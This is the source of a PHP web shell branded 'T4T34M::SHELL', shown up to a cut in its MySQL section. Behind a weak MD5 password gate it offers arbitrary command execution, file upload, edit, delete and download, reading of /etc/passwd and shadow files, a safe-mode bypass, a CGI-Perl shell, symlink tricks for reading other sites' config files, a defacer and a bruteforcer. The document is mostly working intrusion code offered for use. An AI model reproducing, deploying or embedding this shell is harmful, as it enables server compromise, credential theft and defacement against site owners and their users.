<?php
$pass = '202cb962ac59075b964b07152d234b70';#123
if(isset($_COOKIE["pass"]) != $pass){
	if( @md5($_POST['passwrd']) == $pass){
		print '<script>document.cookie="pass='.md5($_POST['passwrd']).';";</script>';
	}else{
		echo'<form method="POST"><input name="passwrd" type="password" onfocus="if (this.value == \'PassWord\') this.value = \'\';" /><input type="submit" value=">" /></form>';
		exit;
	}
}
?>
<?php @set_time_limit(0);@error_reporting(0);?>
<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title></title>
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
	<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV" crossorigin="anonymous"></script>

	<script>
	function goBack() {
	window.history.back();
	}
	</script>
 <style type="text/css">
@charset "UTF-8";
@import url(https://fonts.googleapis.com/css?family=Open+Sans:300,400,700);
body {font-family: 'Open Sans', sans-serif;font-weight: 300;line-height: 1.42em;color:#A7A1AE; background-color:#E4E8F0;}
.container{text-align: left;width: 100%;display: table;}
.container td, .container th{padding-bottom: 0.5%;padding-top: 0.5%;padding-left:0.1%;}
h1{font-weight: 300;color: #999;}
a{font-weight: 300;color: #4F59A6;}a:hover{font-weight: 700;color: #333;text-decoration: none}
.container th h1 {font-weight: bold;font-size: 1em;text-align: left;color: #333;}
.container tr:nth-child(odd){background-color: #E6E7ED;}
.container tr:nth-child(even){background-color: #E8EEF7;}
.container th{background-color: #E2E4E7;}
.container td:first-child { color: #000000; }
 </style>

</head>
<body>
<div class="container">
<h1 align="center">T4T34M::SHELL <small style="font-size:10px;color:#219fee">20211215 - <button onclick="goBack()">Go Back</button></small> </h1>


<link rel="shortcut icon" href='data:image/jpeg;base64,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' />
<center>
<pre>
<?php echo '<p>server ip :<a href="http://www.bing.com/search?q=ip%3A'.gethostbyname($_SERVER["HTTP_HOST"]).'" target="_blank">'.gethostbyname($_SERVER["HTTP_HOST"]).'</a></p><p>ID='.getmyuid().'('.get_current_user().') - UID='.getmyuid().'('.get_current_user().') - GID='.getmygid().'('.get_current_user().')</p>';
echo'<p>[ <a href="'.basename(__FILE__).'" >HOME</a> ][ <a href="?info" >SEC.INFO</a> ][ <a href="?files&cwd='.getcwd().'" >FILES</a> ][ <a href="?exec&cwd='.getcwd().'" >EXEC</a> ][ <a href="?bypass&cwd='.getcwd().'" >BYPASS</a> ][ <a href="?mysql" >MYSQL_TOOLZ</a> ][ <a href="?network" >NETWORK_TOOLZ</a> ][ <a href="?defacer&cwd='.getcwd().'" >DEFACER</a> ][ <a href="?brute" >BRUTEFORCER</a> ]</p></pre>
<table border="1" cellpadding=\'5\' style="width: 100%;table-layout: fixed;">';

if(isset($_REQUEST['cwd'])){
		$cwd = trim($_REQUEST['cwd']);
		chdir($cwd);
}

if(isset($_GET['info'])){
	echo'<tr><td align="center"><font size="2" face="Courier">uname -a: <a href="http://www.exploit-db.com/search/?action=search&filter_exploit_text='.php_uname("r").'"target="_blank"><u>'.php_uname().'</u></font></a>';
	echo'<br /><br /><font size="2" face="Courier">Software : <u>'.getenv("SERVER_SOFTWARE").'</u></font>';
	echo'<br /><br /><font size="2" face="Courier">PHP Version: <u>'.@phpversion().'</u></font></td></tr>';
	if( @ini_get("safe_mode") or strtolower( @ini_get("safe_mode")) == "on"){
		echo'<tr><td align="center"><font size="2" face="Courier">Safe Mode: <b><u><font color="red">ON (Secure)</u></b></font>';
	}else{
		echo'<tr><td align="center"><font size="2" face="Courier">Safe Mode: <b><u><font color="green">OFF (Not Secure)</u></b></font>';
	}
	echo' || Open_BaseDir: <u>'.server_info("openbase_dir").'</u></font>';
	echo'<br /><br /><font size="2" face="Courier">Disabled Functions: <u>'.server_info("showdisablefunctions").'</u></font></b></td></tr>';
	echo'<tr><td align="center"><font size="2" face="Courier">shadow File is: <u>'.server_info("shadow").'</u> || named.conf File is: <u>'.server_info("named_conf").'</u> || passwd File is: <u>'.server_info("passwd").'</u></font></td></tr>';
	echo'<tr><td align="center"><font size="2" face="Courier">Perl: <u>'.server_info("testperl").'</u> || Python: <u>'.server_info("testpy").'</u> || Wget: <u>'.server_info('testwget').'</u></font></td></tr>';
}elseif(isset($_GET['files'])){
	?>




	<?php
	echo'<tr><td align="left">';
	echo'<b><font size="2" face="Courier">Current Path : '.getcwd().'</font></b>';
	echo'<br />
	<form method="GET"><b><font size="2" face="Courier"><font color="red">Or</font> Select Your Path : </font></b>
	<input type="hidden" name="files">
	<input type="text" name="cwd" value="'.getcwd().'" /><input type="submit" value=">>" /></form>';
	echo'<form method="POST" enctype="multipart/form-data"><b><font size="2" face="Courier">Upload File : </font></b><input name="fil3" type="file" /> <input name="path" type="text" value="'.getcwd().'" /> <input type="submit" value="Upload" /></form>';
	if(isset($_FILES['fil3']) && isset($_POST['path'])){
		if(move_uploaded_file($_FILES['fil3']['tmp_name'],$_POST['path'].'/'.$_FILES['fil3']['name'])){
			echo'<font color="green" size="2" face="Courier">File Upload Done.</font><br /><br />';
		}else{
			echo'<font color="red" size="2" face="Courier">File Upload Error.</font><br /><br />';
		}
	}
	echo'<form method="POST"><select name="cr_opt"><option value="makedir">Dir</option><option value="makefile">File</option></select><input type="text" name="name" /><input type="submit" value="Creat" /></form>';
	if(isset($_POST['name'])){
		switch($_POST['cr_opt']){
			case 'makedir':
				$dir_1 = trim($_POST['name']);
				if(!file_exists($dir_1) && !is_dir($dir_1)){
					if(mkdir($dir_1)){
						echo'<font color="green" size="2" face="Courier">'.$dir_1.' Created!</font><br /><br />';
					}else{
						echo'<font color="red" size="2" face="Courier">Can\'t Creat '.$dir_1.'</font><br /><br />';
					}
				}else{
					echo'<font color="red" size="2" face="Courier">'.$dir_1.' Already Exists!</font><br /><br />';
				}
				break;
			case 'makefile':
				$file=trim($_POST['name']);
				$f=fopen($file, 'w');
				if($f){
					if(isset($_POST['update'])){
						$data=$_POST['update'];
						$w=fwrite($f, $data);
						if($w){
							echo'<font color="green" size="2" face="Courier">'.$file.' Created!</font><br /><br />';
						}else{
							echo'<font color="red" size="2" face="Courier">Can\'t Creat '.$file.'</font><br /><br />';
						}
					}else{
						echo'<form method="POST">';
						echo'<textarea name="update" cols="50" rows="15"></textarea>';
						echo'<br /><input type="submit" value=">>" /><input type="hidden" name="cwd" value="'.$_GET['cwd'].'" /><input type="hidden" name="cr_opt" value="makefile" /><input type="hidden" name="name" value="'.$_POST['name'].'" /></form>';
					}
				}else{
					echo'<font color="red" size="2" face="Courier">Can\'t Creat '.$file.'</font><br /><br />';
				}
				break;
		}
	}
	if($handle = opendir($_REQUEST['cwd'])){
		while(($file = readdir($handle))!= false){
			if(is_dir($file)){
				$directories[] = $file;
			}else{
				$files[] = $file;
			}
		}
		asort($directories);
		asort($files);
		?>
		<div class="form-group pull-right">
		    <input type="text" class="search form-control" placeholder="What you looking for?">
		</div>
		<span class="counter pull-right"></span>
		<table class="container">
	<thead>
		<tr>
			<th>#</th>
			<th><h1>Filename</h1></th>
			<th><h1>Owner/Group</h1></th>
			<th><h1>Permissions</h1></th>
			<th><h1>Action</h1></th>
		</tr>
	</thead>
	<tbody>


			<?php
			$xi=1;
		foreach($directories as $dir){
			$xo=$xi++;
			if(fileowner($dir)){$owner_d = fileowner($dir);}else{$owner_d = "NONE";}
			if(filegroup($dir)){$group_d = filegroup($dir);}else{$group_d = "NONE";}
			echo"<tr><th scope='row'>$xo</th><td><b><font size='2' face='Courier'><a href='?files&cwd=".getcwd()."/$dir'>[ $dir ]</a></td><td align='center'>$owner_d/$group_d</td><td align='center'><font color='".get_color($dir)."'>[".perm($dir)."]</font></font></b></td><td><form method='POST'><input type='hidden' name='file' value='".$dir."' /><select name='opt'><option value='delete'>Delete</option></select><input type='submit' value='>>' /> <a href='?action=rename&file=".$dir."&cwd=".getcwd()."' target='_blank'>[R]</a></form></td><tr>";
		}
		foreach($files as $fil){
			if(fileowner($fil)){$owner_f = fileowner($fil);}else{$owner_f = "NONE";}
			if(filegroup($fil)){$group_f = filegroup($fil);}else{$group_f = "NONE";}
			echo"<td><b><font size='2' face='Courier' color='grey'>$fil</td><td align='center'>$owner_f/$group_f</td><td align='center'><font color='".get_color($fil)."'>[".perm($fil)."]</font></font></b></td><td><form method='POST'><input type='hidden' name='file' value='".$fil."' /><select name='opt'><option value='delete'>Delete</option><option value='download'>Download</option></select><input type='submit' value='>>' /> <a href='?action=edit&file=".$fil."&cwd=".getcwd()."' target='_blank'>[E]</a> <a href='?action=rename&file=".$fil."&cwd=".getcwd()."' target='_blank'>[R]</a> <a href='?action=chmod&file=".$fil."&cwd=".getcwd()."' target='_blank'>[C]</a></form></td><tr>";
		}
	}else{
		echo"<br /><u><font size='2' face='Courier'>Error!</u> Can't open <b>".$_REQUEST['cwd']."</b>!</font><br />";
	}
	if(isset($_POST['file'])){
		$file = trim($_POST['file']);
		switch($_POST['opt']){
			case 'delete':
				if(!is_dir($file)){
					if(unlink($file) or delete($file)){
						echo'<center><b><font color="green" size="2" face="Courier">The File '.$file.' Deleted!</font></b></center>';
					}else{
						echo'<center><b><font color="red" size="2" face="Courier">Can\'t Delete The File: '.$file.'</font></b><br /></center>';
					}
				}else{
					if(!empty($file)){
						array_map('unlink', glob("$file/*.*"));
						if(rmdir($file)){
							echo'<center><b><font color="green" size="2" face="Courier">The Dir '.$file.' Deleted!</font></b><br /></center>';
						}else{
							echo'<center><b><font color="red" size="2" face="Courier">Can\'t Delete The Dir: '.$file.'</font></b><br /></center>';
						}
					}else{
						if(rmdir($file)){
							echo'<center><b><font color="green" size="2" face="Courier">The Dir '.$file.' Deleted!</font></b><br /></center>';
						}
					}
				}
				break;
			case 'download':
				header('Content-type: text/plain');
				header('Content-Disposition: attachment; filename="'.$file.'"');
				echo(file_get_contents($file));
				exit();
				break;
		}
	}
	echo'</table>';
}elseif(isset($_GET['action'])){
	echo'<tr><td align="center">';
	if($_GET['action'] == 'rename'){
		echo'<br /><form method="POST"><input type="text" value="'.$_GET['file'].'" /><input type="text" name="new" placeholder="New" /><input type="submit" value=">>" /></form>';
		$file = $_GET['file'];
		if(!empty($_POST['new'])){
			$new = trim($_POST['new']);
			if(rename($file, $new)){
				echo'<font color="green" size="2" face="Courier">DONE!</font><br /><br />';
				echo'<script type="text/javascript">setTimeout("window.close();", 500);</script>';
			}else{
				echo'<font color="red" size="2" face="Courier">ERROR!</font><br /><br />';
			}
		}
	}elseif($_GET['action'] == 'chmod'){
		echo'<br /><form method="POST"><input type="text" value="'.$_GET['file'].'" /><input type="text" name="new" placeholder="New" /><input type="submit" value=">>" /></form>';
		$file = $_GET['file'];
		if(!empty($_POST['new'])){
			$new = trim($_POST['new']);
			if(chmod($file, $new)){
				echo'<font color="green" size="2" face="Courier">DONE!</font><br /><br />';
				echo'<script type="text/javascript">setTimeout("window.close();", 500);</script>';
			}else{
				echo'<font color="red" size="2" face="Courier">ERROR!</font><br /><br />';
			}
		}
	}elseif($_GET['action'] == 'edit'){
		$file = $_GET['file'];
		$src = htmlspecialchars(file_get_contents($file));
		echo'<br /><b><font size="2" face="Courier">'.$file.'</font></b><br />';
		$f = fopen($file, 'w') or die('<b><font color="green" size="2" face="Courier"> can\'t Open The File</font></b>');
		if(isset($_POST['update'])){
			$data = $_POST['update'];
			$w = fwrite($f, $data);
			if($w){
				echo'<center><b><font color="green" size="2" face="Courier">'.$file.' Edited!</font></b><br /></center>';
				echo'<script type="text/javascript">setTimeout("window.close();", 500);</script>';
			}else{
				echo'<center><b><font color="red" size="2" face="Courier">Can\'t Edit '.$file.'</font></b><br /></center>';
			}
		}else{
			echo'<form method="POST">';
			echo'<textarea name="update" cols="84" rows="25">'.$src.'</textarea>';
			echo'<br /><input type="submit" value="Go" /></form>';
		}
	}
}elseif(isset($_GET['exec'])){
	echo'<tr><td align="center">';
	echo'<br /><form method="POST"><input size="100" name="cmd" /><input value="Exec Command" type="submit" /></form>';
	if(isset($_POST['cmd'])){
		$cmd = trim($_POST['cmd']);
		echo'<textarea rows="20" cols="100">';
		echo wsoEx($cmd);
		echo'</textarea><br /><br />';
	}
	echo'</tr></td>';
}elseif(isset($_GET['bypass'])){
	echo'<tr><td align="center">';
	echo'<br /><u><font size="2" face="Courier">ADDONS & TOOLZ:</font></u><br />';
	echo'<br /><form method="POST"><input type="submit" value="CGI-PERL" name="cgi-perl" /> <input type="submit" value="KILL-SAFEMODE" name="safemode-killer" /> <input type="submit" value="USERS & DOMAINS" name="dom_user" /></form>';
	if(isset($_POST['cgi-perl'])){
		echo creat_cgi('shell');
	}if(isset($_POST['safemode-killer'])){
		safemodekiller();
	}
	if(isset($_POST['dom_user'])){
		echo creat_cgi('users');
	}
	echo'<u><font size="2" face="Courier">READ FILE:</font></u><br />';
	echo'<br /><form method="POST"><input type="text" name="file" size="22" value="/etc/passwd" /><input type="submit" value="READ FILES" /></form>';
	if(isset($_POST['file'])){
		$file = trim($_POST['file']);
		echo"<textarea rows=30 cols=125>";
		readfils($file);
		echo"</textarea><br /><br />";
	}
	echo'<u><font size="2" face="Courier">SYMLINK & COPY:</font></u><br />';
	echo'<br /><form method="post"><input type="text" name="path" placeholder="/home/user/public_html/config.php" size="50"/><input type="text" name="output" placeholder="output.txt" size="10"/><input type="submit" value="Bypass" /></form>';
	if(isset($_POST['path']) && isset($_POST['output'])){
		$path = trim($_POST['path']);
		$output = trim($_POST['output']);
		Sym($path, $output);
	}
	echo'</tr></td>';

}
elseif(isset($_GET['showall'])){
	$showall = $_GET['showall'];
	$h1 = trim($_GET['host']);$u1 = trim($_GET['user']);$p1 = trim($_GET['pass']);$d1 = trim($_GET['db']);
	$mysqli = new mysqli("$h1","$u1","$p1");$mysqli->select_db("$d1");
	if (mysqli_connect_errno()) {	printf("Connect failed: %s\n", mysqli_connect_error());	exit();}
	if ($result = $mysqli->query("show tables;")) {
		while($row = $result->fetch_row()){
			echo "<table border=\"1\" cellpadding=\'5\' style=\"width: 35%;table-layout: fixed;\">
			<tr><td align=center>
